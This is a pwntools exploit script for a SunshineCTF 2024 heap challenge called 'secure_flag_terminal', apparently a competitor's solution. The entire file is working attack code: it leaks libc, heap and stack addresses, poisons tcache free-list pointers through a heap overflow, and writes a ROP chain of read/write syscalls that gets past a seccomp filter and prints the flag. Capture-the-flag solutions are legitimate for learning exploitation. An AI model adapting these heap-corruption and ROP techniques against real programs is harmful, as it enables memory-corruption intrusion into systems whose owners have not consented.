#!/usr/bin/env python3

from pwn import *

exe = ELF("./secure_flag_terminal_patched")
libc = ELF("./libc_chall.so", checksec = False)
ld = ELF("./ld-linux-x86-64.so.2", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.sunshinectf.games", 24002)

    return r


def touch(size: int) -> int:
    r.sendlineafter(b": ", b"1")
    r.sendlineafter(b"--> ", str(size).encode("ascii"))


def vim(index: int, data: bytes):
    r.sendlineafter(b": ", b"2")
    r.sendlineafter(b"--> ", str(index).encode("ascii"))
    r.sendafter(b"--> ", data)


def cat(index: int) -> bytes:
    r.sendlineafter(b": ", b"3")
    r.sendlineafter(b"--> ", str(index).encode("ascii"))
    return r.recvlines(3)[-1]


def rm(index: int):
    r.sendlineafter(b": ", b"4")
    r.sendlineafter(b"--> ", str(index).encode("ascii"))


def main():
    r = conn()

    r.recvuntil(b"Kernel Seed: ")
    libc.address = int(r.recvline().strip(), 16) - libc.sym.rand        # &rand ^ 0xD3C0DEAD
    log.info(f"libc @ 0x{libc.address:x}")

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    syscall = rop.find_gadget(['syscall', 'ret'])[0]


    """
         line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
     0002: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
     0004: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0006
     0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
     0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0012
     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0012: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0014
     0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0014: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0016
     0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0016: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0018
     0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0018: 0x06 0x00 0x00 0x00000000  return KILL
    """

                    # List of chunks in "flags" array
    touch(0x18)     # [x] -- [ ] -- [ ] -- [ ]
    touch(0x18)     # [x] -- [x] -- [ ] -- [ ]

    # Put chunk 2 in tcache
    rm(2)           # [x] -- [ ] -- [ ] -- [ ]

    # Overwrite chunk 2 and view chunk 1 to leak heap address
    vim(1, b"A" * 0x28)
    heap = u64(cat(1).strip(b"A").ljust(8, b"\x00")) - 0x10
    log.info(f"heap @ 0x{heap:x}")

    # Fix chunk 2 to avoid messing up the heap and overwrite its fd ptr to file desc chunk
    vim(1, b"A" * 0x18 + p64(0x21) + p64(heap + 0x1270) + p64(heap + 0x10))

    # Allocate chunk 2 and chunk 3 (which is the chunk holding the duplicated file descriptor)
    touch(0x18)     # [1] -- [2] -- [ ] -- [ ]
    touch(0x18)     # [1] -- [2] -- [3] -- [ ]

    fd = u16(cat(3).ljust(2, b"\x00"))      # Note: sometimes it doesn't get a right file desc.
    log.info(f"fd : 0x{fd:x}")

    # Clear the  while list to make space for next allocations
    rm(3)
    rm(2)
    rm(1)           # [ ] -- [ ] -- [ ] -- [ ]

    # Repeat the process to leak the stack address (more precisely the $rip address)
    # but with a different bin since the 0x20 (somehow) corrupted
    touch(0x28)     # [x] -- [ ] -- [ ] -- [ ]
    touch(0x28)     # [x] -- [x] -- [ ] -- [ ]

    rm(2)           # [x] -- [ ] -- [ ] -- [ ]

    vim(1, b"A" * 0x28 + p64(0x31) + p64(libc.sym.environ))

    touch(0x28)     # [x] -- [x] -- [ ] -- [ ]
    touch(0x28)     # [x] -- [x] -- [x] -- [ ]

    rbp = u64(cat(3).ljust(8, b"\x00")) - 0xf8
    log.info(f"rbp @ 0x{rbp:x}")

    rm(2)           # [x] -- [x] -- [ ] -- [ ]
    rm(1)           # [x] -- [ ] -- [ ] -- [ ]

    # Same process again but now we overwrite $rip with a ROP chain
    touch(0x38)     # [X] -- [x] -- [ ] -- [ ]
    touch(0x38)     # [X] -- [x] -- [x] -- [ ]

    rm(3)           # [X] -- [x] -- [ ] -- [ ]

    vim(2, b"A" * 0x38 + p64(0x41) + p64(rbp))

    touch(0x38)     # [X] -- [x] -- [x] -- [ ]
    touch(0x38)     # [X] -- [x] -- [x] -- [x]

    # ssize_t read(int fd, void buf[.count], size_t count);
    # ssize_t write(int fd, const void buf[.count], size_t count);
    payload = flat(
                    rbp,

                    # read(fd, heap + 0x1270, 0x30);
                    pop_rdi,
                    fd,
                    pop_rsi,
                    heap + 0x1270,      # Need somewhere to write the content
                    pop_rdx,
                    0x30,
                    pop_rax,
                    0x0,
                    syscall,

                    # write(stdout, heap + 0x1270, 0x30);
                    pop_rdi,
                    0x1,
                    pop_rsi,
                    heap + 0x1270,
                    pop_rdx,
                    0x30,
                    pop_rax,
                    0x1,
                    syscall
                )

    vim(4, payload)

    # Enter wrong option to exit and trigger the ROP chain
    r.sendlineafter(b": ", b"99")
    
    r.recvuntil(b"do better\n")
    flag = r.recvuntil(b"}", drop = False).decode("ascii")
    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
